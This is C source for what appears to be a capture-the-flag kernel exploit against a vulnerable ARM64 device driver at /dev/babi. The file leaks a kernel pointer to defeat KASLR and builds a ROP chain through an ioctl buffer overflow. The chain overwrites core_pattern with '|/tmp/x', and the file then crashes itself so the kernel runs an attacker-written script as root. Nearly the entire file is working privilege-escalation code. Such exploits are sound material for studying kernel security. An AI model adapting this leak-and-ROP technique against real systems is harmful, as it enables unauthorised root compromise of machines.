#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/ioctl.h>

typedef unsigned long long u64;
u64 kaslr_slide = 0;

// define commands
#define IOCTL_BASE 'W'
#define	CMD_READ		_IO(IOCTL_BASE, 0)
#define	CMD_WRITE		_IO(IOCTL_BASE, 1)

typedef struct request {
	void*	ubuf;
	size_t	size;
} request_t;

int fd;

void do_read(char *buf, size_t len)
{
	request_t req = {.ubuf = buf, .size=len};
	int ret = ioctl(fd, CMD_READ, &req);
	assert(ret == 0);
}

void do_write(char *buf, size_t len)
{
	request_t req = {.ubuf = buf, .size=len};
	int ret = ioctl(fd, CMD_WRITE, &req);
	assert(ret == 0);
}

void hex_print(void *addr, size_t len)
{
	u64 tmp_addr = (u64)addr;
	puts("");
	for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
	}
}

void overwrite_modprobe()
{
	fd = open("/dev/babi", O_RDWR);
	assert(fd >= 0);

	char buf[0x100];
	memset(buf, 0, sizeof(buf));
	do_read(buf, sizeof(buf)-1);
	hex_print(buf, sizeof(buf)-1);

	u64* rop = (u64*)buf;
	kaslr_slide = rop[4] - 0xffff80008032fcd4;
	printf("kaslr_slide: %#llx\n", kaslr_slide);

	int idx = 4;
	rop[idx++] = kaslr_slide + 0xffff800080d96948; //: true  : ldr x4, [sp, #0x18]; and w0, w0, #0xffff; lsr w0, w0, #0xe; str w0, [x4]; ldp x29, x30, [sp], #0x20; ret
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = kaslr_slide + 0xffff800080faff2c; // : ldp x6, x0, [sp, #0x18] ; blr x6
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = kaslr_slide + 0xffff8000828d8d10; // core_pattern
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = kaslr_slide + 0xffff800080faff2c; // : ldp x6, x0, [sp, #0x18] ; blr x6
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = kaslr_slide + 0xffff800080e36428; //: true  : str x0, [x4]; mov w0, #1; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x30; ret
	rop[idx++] = 0x782f706d742f7c; // |/tmp/x
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = 0x4141414141414141;
	rop[idx++] = kaslr_slide + 0xffff80008014c640; // msleep
	rop[idx++] = 0x41414141;
	do_write(buf, sizeof(buf)-1);
}

char *path = NULL;
void get_flag()
{
	char *cmd = NULL;
	system("echo '#!/bin/sh\nchmod 666 /flag\n' > /tmp/x; chmod +x /tmp/x");
	asprintf(&cmd, "CRASH=1 %s", path);
	system(cmd);
	system("cat /flag");
}

int main(int argc, char **argv)
{
	if(getenv("CRASH")) {
		int x = *(int *)NULL;
	}

	path = strdup(argv[0]); // save self_path
	if(!fork()) {
		overwrite_modprobe();
	}
	sleep(1);
	get_flag();
}
